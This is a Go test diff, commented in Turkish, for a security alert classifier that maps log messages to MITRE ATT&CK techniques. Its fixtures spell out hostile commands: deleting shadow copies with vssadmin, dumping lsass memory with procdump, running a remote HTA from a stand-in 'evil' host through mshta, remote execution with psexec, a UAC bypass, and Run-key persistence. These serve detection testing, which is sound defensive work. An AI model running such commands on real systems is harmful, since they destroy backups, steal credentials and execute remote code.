@@ -65,6 +65,31 @@ func TestClassifyWindows(t *testing.T) {
 	}
 }
 
+// TestClassifyCriticalTechniques, impact/credential-access/defense-evasion
+// desenlerinin genel "kurcalama"/default dalına düşmek yerine DOĞRU tekniğe
+// eşlendiğini doğrular (alarm zenginleştirme doğruluğu).
+func TestClassifyCriticalTechniques(t *testing.T) {
+	cases := []struct {
+		msg    string
+		wantID string
+	}{
+		{"fidye notu: README_DECRYPT.txt, dosyalar .encrypted", "T1486"},
+		{"vssadmin delete shadows /all /quiet çalıştırıldı", "T1490"},
+		{"procdump -ma lsass.exe lsass.dmp (credential dump)", "T1003"},
+		{"mshta.exe http://evil/x.hta çalıştırıldı", "T1218"},
+		{"psexec \\\\DC01 -s cmd ile uzak yürütme", "T1021"},
+		{"fodhelper.exe ile uac bypass", "T1548"},
+		{"svchost.exe masquerading in temp path", "T1036"},
+		{"reg add HKLM\\...\\Run ile modify registry", "T1112"},
+	}
+	for _, c := range cases {
+		got, ok := Classify("SECURITY", c.msg)
+		if !ok || got.ID != c.wantID {
+			t.Errorf("Classify(SECURITY,%q)=(%s,%v) beklenen %s", c.msg, got.ID, ok, c.wantID)
+		}
+	}
+}
+
 func TestCatalogUnique(t *testing.T) {
 	seen := map[string]bool{}
 	cat := Catalog()
